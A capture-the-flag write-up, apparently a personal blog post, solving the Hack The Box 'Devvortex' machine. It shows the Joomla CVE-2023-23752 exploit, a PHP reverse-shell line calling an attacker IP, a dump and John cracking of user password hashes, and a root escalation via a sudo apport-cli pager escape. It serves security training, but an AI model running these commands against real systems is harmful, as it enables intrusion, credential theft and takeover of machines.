---
layout: post
section-type: post
has-comments: true
title: Hack The Box - Devvortex
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps

##### Nmap Results

```
sudo nmap -Pn -sT -sU -sC -sV 10.10.11.242
```
![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4cd30184-fed4-4548-8ee9-a091ef02f388)


##### Whatweb

```
whatweb 10.10.11.242
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f7ab0b82-c9cf-4be3-890f-a707d9b7c44c)


Key findings:

- SSH (Port 22): OpenSSH 8.2p1 on Ubuntu.
- HTTP (Port 80): Nginx 1.18.0 on Ubuntu, redirecting to `http://devvortex.htb/`.

The IP address and domain were added to `/etc/hosts`:

```
echo "10.10.14.242 devvortex.htb" | sudo tee -a /etc/hosts
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/55866778-4e0b-4bb0-bcd5-066072be6006)


##### Directory Brute Force

```
ffuf -w /home/kali/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/aa818584-a207-406f-832a-9ce1046e4682)


Found: `dev.devvortex.htb`

I've added it to my **/etc/hosts** and proceeded to explore this website. Hitting `/robots.txt` revealed it's content and it became clear: this is a **Joomla CMS**.

```
echo '10.10.11.242        dev.devvortex.htb' | sudo tee -a /etc/hosts
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d2ffe1ce-7def-45fa-81ee-2031b9c7f7e8)


Navigating to the `/administrator` directory..

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/6969337a-10b3-4774-af60-eeeeb3ea3fee)


##### Enumerating Joomla

Joomla interesting lets see if we can find out the version

Useful Resources: 
https://hackertarget.com/attacking-enumerating-joomla/?ref=benheater.com#joomla-core-version
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/377a3324-fc35-4967-a920-d2b1fc63ac74)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3fd9d11f-18e1-4a2c-b3fd-2300a4a503fb)

`Joomla 4.2.6` lets dig and search for some exploits

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/2b59140b-a62f-4f46-9832-db6f59657ef9)

Running `searchsploit joomla 4.2.6` we can see that there is an unauthenticated information disclosure vulnerability we can try. 

```
Joomla! v4.2.8 - Unauthenticated information disclosure | php/webapps/51334.py
```

```
searchsploit -m php/webapps/51334.py
```

Looking over the source code, we can see it's actually a `ruby` script

```
mv 51334.py exploit.rb
```

to work this script we need to install few missing gems:

```
sudo gem install httpx
sudo gem install docopt
sudo gem install paint
```

```
ruby exploit.rb http://dev.devvortex.htb
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e9145417-6342-4506-a407-efb05a9171b3)

https://github.com/c0d3cr4f73r/CVE-2023-23752.git


### Exploit

First thing I tried, is to SSH into the server with those credentials, but my attempt failed. After all, these credentials enabled Joomla Administrator dashboard access:

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ee594bb3-8bee-4457-950f-cda5e53b116a)

Since this is a CMS, based on PHP, we'll navigate to the templates and create a PHP file/page to execute system commands, for RCE.
`System ➡ Templates ➡ Administrator Templates`.

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
```

Establishing a connection using netcat:

```
nc -l 4444
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/115d4dcc-ae93-432a-9c0c-8757bc1ccb78)


Stabilizing the shell:

```
export TERM=linux
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Knowing that the credentials obtained from exploiting the Joomla information leak vulnerability were for MySQL, I proceeded to connect to MySQL to explore the users' table:

```
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26575
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;  
+-------------------------------+  
| Tables_in_joomla              |  
+-------------------------------+  
| sd4fg_action_log_config       |  
| sd4fg_action_logs             |  
| sd4fg_action_logs_extensions  |  
| sd4fg_action_logs_users       |  
| sd4fg_assets                  |  
| sd4fg_associations            |  
| sd4fg_banner_clients          |  
| sd4fg_banner_tracks           |  
| sd4fg_banners                 |  
| sd4fg_categories              |  
| sd4fg_contact_details         |  
| sd4fg_content                 |  
| sd4fg_content_frontpage       |  
| sd4fg_content_rating          |  
| sd4fg_content_types           |  
| sd4fg_contentitem_tag_map     |  
| sd4fg_extensions              |  
| sd4fg_fields                  |  
| sd4fg_fields_categories       |  
| sd4fg_fields_groups           |  
| sd4fg_fields_values           |  
| sd4fg_finder_filters          |  
| sd4fg_finder_links            |  
| sd4fg_finder_links_terms      |  
| sd4fg_finder_logging          |  
| sd4fg_finder_taxonomy         |  
| sd4fg_finder_taxonomy_map     |  
| sd4fg_finder_terms            |  
| sd4fg_finder_terms_common     |  
| sd4fg_finder_tokens           |  
| sd4fg_finder_tokens_aggregate |  
| sd4fg_finder_types            |  
| sd4fg_history                 |  
| sd4fg_languages               |  
| sd4fg_mail_templates          |  
| sd4fg_menu                    |  
| sd4fg_menu_types              |  
| sd4fg_messages                |  
| sd4fg_messages_cfg            |  
| sd4fg_modules                 |  
| sd4fg_modules_menu            |  
| sd4fg_newsfeeds               |  
| sd4fg_overrider               |  
| sd4fg_postinstall_messages    |  
| sd4fg_privacy_consents        |  
| sd4fg_privacy_requests        |  
| sd4fg_redirect_links          |  
| sd4fg_scheduler_tasks         |  
| sd4fg_schemas                 |  
| sd4fg_session                 |  
| sd4fg_tags                    |  
| sd4fg_template_overrides      |  
| sd4fg_template_styles         |  
| sd4fg_ucm_base                |  
| sd4fg_ucm_content             |  
| sd4fg_update_sites            |  
| sd4fg_update_sites_extensions |  
| sd4fg_updates                 |  
| sd4fg_user_keys               |  
| sd4fg_user_mfa                |  
| sd4fg_user_notes              |  
| sd4fg_user_profiles           |  
| sd4fg_user_usergroup_map      |  
| sd4fg_usergroups              |  
| sd4fg_users                   |  
| sd4fg_viewlevels              |  
| sd4fg_webauthn_credentials    |  
| sd4fg_workflow_associations   |  
| sd4fg_workflow_stages         |  
| sd4fg_workflow_transitions    |  
| sd4fg_workflows               |  
+-------------------------------+  
71 rows in set (0.00 sec)  
  
mysql> select * from sd4fg_users;  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-26 13:51:53 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |  
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |  
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+  
2 rows in set (0.00 sec)
```

In the users' table, I found another user, logan, with a BCrypt hashed password. To crack this hash, I created a file named hash.txt, placed the hash inside, and initiated the attack using John the Ripper:

```
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash
```

```
john --wordlist=/home/kali/Tools/rockyou.txt hash
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f64bbd88-8ac4-43da-b81d-dc5acc2a9dc5)


Let’s login with these credentials Via SSH.

```
ssh logan@devvortex.htb
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/7ab345ec-6e40-49e3-b702-bf6d1b208234)

I found a binary file we can use this binary with the `sudo` command without a password.

```
sudo -l
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1eb72de5-c94c-4822-a317-0b4c9623b2fe)

I could run `/usr/bin/apport-cliwith` sudo, but needed to figure out how to exploit it. Quick research revealed a CVE:

```
A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.
```

```
sudo /usr/bin/apport-cli -f
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/9db6f8ac-26ab-4930-83a2-ea577b01b3d7)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e18a473d-4722-4d3f-9826-686dc2c1ef7b)

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/dc77a946-1b15-4c61-8949-b8a9ea573959)

```
!id
!/bin/bash
```

![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e21fb320-3251-44cb-be99-d3137ed42f51)

Collecting the root flag..
